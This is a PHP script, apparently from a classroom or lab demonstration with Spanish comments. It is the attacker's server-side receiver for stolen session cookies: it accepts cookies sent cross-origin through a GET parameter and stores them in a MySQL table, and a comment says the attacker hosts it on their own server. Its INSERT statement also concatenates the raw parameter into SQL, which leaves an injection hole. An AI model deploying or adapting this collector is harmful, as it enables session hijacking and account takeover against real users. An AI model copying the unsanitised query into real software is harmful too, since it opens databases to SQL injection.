<?php
header('Access-Control-Allow-Origin: *');
#Guardar cookies recibidas en un archivo de texto
#Obviamente el atacante tendrá este código en un servidor propio
// file_put_contents("cookies.txt", $_GET["cookies"] . PHP_EOL, FILE_APPEND);

$conexion = mysqli_connect("db-claves", "user", "user", "bd_claves");
mysqli_set_charset($conexion, 'utf8');
$conexion->query("SET time_zone = 'America/Guatemala'");
if (!$conexion) {
	header("Location: index.php?error=Conexión fallida con la base de datos");
}

//INSERTAR EN LA BASE DE DATOS
$hoy2 = date("Y-m-d H:i:s");
$conexion->autocommit(false);
try {
	$res = $conexion->query("INSERT INTO `tb_sesiones`(`clave`, `fecha`) VALUES ('".$_GET["cookies"]."','".$hoy2."')");
	// $res = $conexion->query("INSERT INTO `tb_sesiones`(`clave`, `fecha`) VALUES ('prueba de clave','".$hoy2."')");
	if ($res) {
		$conexion->commit();
		header("Location: index.php");
	} else {
		$conexion->rollback();
		header("Location: index.php?error=Fallo al insertar el registro en la bd");
	}
} catch (Exception $e) {
	$conexion->rollback();
	header("Location: index.php?error=Hubo un error insertar el registro en la bd");
}
mysqli_close($conexion);

?>